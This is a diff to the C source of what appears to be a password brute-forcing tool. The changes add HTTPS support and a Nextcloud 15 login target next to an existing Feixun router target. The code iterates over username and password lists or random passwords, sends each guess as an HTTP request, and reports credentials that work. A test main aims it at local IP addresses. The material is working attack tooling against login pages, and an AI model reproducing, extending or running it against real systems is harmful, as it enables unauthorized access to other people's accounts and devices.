@@ -22,8 +22,10 @@ extern void FreeProcessFileBuff(pStrHeader p);
 extern int ProcessFile(const char *path, pStrHeader *output, int flag);
 
 // from ../core/http.c
-extern size_t HTTPPost(const char *url, const char *request, char **response, int debug_level);
-extern void FreeHTTPPostBuff(char *p);
+extern size_t HTTP(const char *url, const char *request, char **response, int debug_level);
+extern void FreeHTTPBuff(char *p);
+extern size_t HTTPS(const char *url, const char *request, char **response, int debug_level);
+extern void FreeHTTPsBuff(char *p);
 
 // from ../core/base64.c
 extern size_t Base64Encode(char **b64message, const unsigned char *buffer, size_t length);
@@ -59,9 +61,22 @@ static int MatchModel(pMatchOutput *output, const char *input)
             DisplayError("MatchModel malloc failed");
             return -1;
         }
-        (*output)->request = FEIXUN_FWR_604H_REQUEST;
-        (*output)->request_data = FEIXUN_FWR_604H_REQUEST_DATA;
-        (*output)->success_or_not = FEIXUN_FWR_604H_SUCCESS;
+        (*output)->request = FEIXUN_FWR_604H_POST_REQUEST;
+        (*output)->request_data = FEIXUN_FWR_604H_POST_REQUEST_DATA;
+        (*output)->success_or_not = FEIXUN_FWR_604H_POST_SUCCESS;
+        (*output)->next = NULL;
+    }
+    else if (strstr(input, "nextcloud15"))
+    {
+        (*output) = (pMatchOutput)malloc(sizeof(MatchOutput));
+        if (!(*output))
+        {
+            DisplayError("MatchModel malloc failed");
+            return -1;
+        }
+        (*output)->request = NEXTCLOUD15_POST_REQUEST;
+        (*output)->request_data = NEXTCLOUD15_POST_REQUEST_DATA;
+        (*output)->success_or_not = NEXTCLOUD15_POST_SUCCESS;
         (*output)->next = NULL;
     }
     else if (strstr(input, "not_sure"))
@@ -191,9 +206,9 @@ static int UListPList(pInput input, size_t u_start, size_t u_end, size_t p_start
 
             // send now
             DisplayDebug(DEBUG_LEVEL_1, input->debug_level, "try username: %s, password: %s", us->str, p->str);
-            if (HTTPPost(input->address, request, &response, 0) == -1)
+            if (HTTP(input->address, request, &response, 0) == -1)
             {
-                DisplayError("HTTPPost failed");
+                DisplayError("HTTP failed");
                 return -1;
             }
 
@@ -213,7 +228,7 @@ static int UListPList(pInput input, size_t u_start, size_t u_end, size_t p_start
                 DisplayInfo("Username: %s - Password: %s", us->str, p->str);
                 return 0;
             }
-            FreeHTTPPostBuff(response);
+            FreeHTTPBuff(response);
             FreeBase64(b64message);
             p = p->next;
         }
@@ -276,9 +291,9 @@ static int UOnePRandom(pInput input)
 
         // send now
         DisplayDebug(DEBUG_LEVEL_1, input->debug_level, "try username: %s, password: %s", input->username, password);
-        if (HTTPPost(input->address, request, &response, 0) == -1)
+        if (HTTP(input->address, request, &response, 0) == -1)
         {
-            DisplayError("HTTPPost failed");
+            DisplayError("HTTP failed");
             return -1;
         }
         // for debug
@@ -297,7 +312,7 @@ static int UOnePRandom(pInput input)
             return 0;
         }
 
-        FreeHTTPPostBuff(response);
+        FreeHTTPBuff(response);
         FreeRandomPasswordBuff(password);
         FreeBase64(b64message);
     }
@@ -365,9 +380,9 @@ static int UOnePList(pInput input, size_t p_start, size_t p_end)
         pthread_t self;
         self = pthread_self();
         DisplayDebug(DEBUG_LEVEL_1, input->debug_level, "tid: %lu, try username: %s, password: %s", self, input->username, ps->str);
-        if (HTTPPost(input->address, request, &response, 0) == -1)
+        if (HTTP(input->address, request, &response, 0) == -1)
         {
-            DisplayError("HTTPPost failed");
+            DisplayError("HTTP failed");
             return -1;
         }
 
@@ -385,7 +400,7 @@ static int UOnePList(pInput input, size_t p_start, size_t p_end)
             DisplayInfo("Username: %s - Password: %s", input->username, ps->str);
             return 0;
         }
-        FreeHTTPPostBuff(response);
+        FreeHTTPBuff(response);
         FreeBase64(b64message);
         ps = ps->next;
     }
@@ -439,15 +454,15 @@ static int UTestPTest(pInput input, int *length)
 
     // send now
     DisplayDebug(DEBUG_LEVEL_1, input->debug_level, "try username: %s, password: %s", input->username, test_password);
-    if (HTTPPost(input->address, request, &response, 0) == -1)
+    if (HTTP(input->address, request, &response, 0) == -1)
     {
-        DisplayError("HTTPPost failed");
+        DisplayError("HTTP failed");
         return -1;
     }
 
     DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "%s", response);
     (*length) = (int)strlen(response);
-    FreeHTTPPostBuff(response);
+    FreeHTTPBuff(response);
     FreeBase64(b64message);
 
     return 0;
@@ -581,7 +596,7 @@ int GuessAttack(pInput input)
 /*
 int main(void)
 {
-
+    // for test
     pInput t_input = (pInput)malloc(sizeof(Input));
     t_input->max_process = 1;
     t_input->max_thread = 1;
@@ -598,6 +613,12 @@ int main(void)
     strcpy(t_input->address, "http://192.168.1.1:80/login.asp");
 
     GuessAttack(t_input);
+
+    char buff[10240] = {'\0'};
+    char *resp;
+    sprintf(buff, "%s", NEXTCLOUD15_GET_REQUEST);
+    HTTPS("https://192.168.1.156", buff, &resp, 3);
+
     return 0;
 }
 */
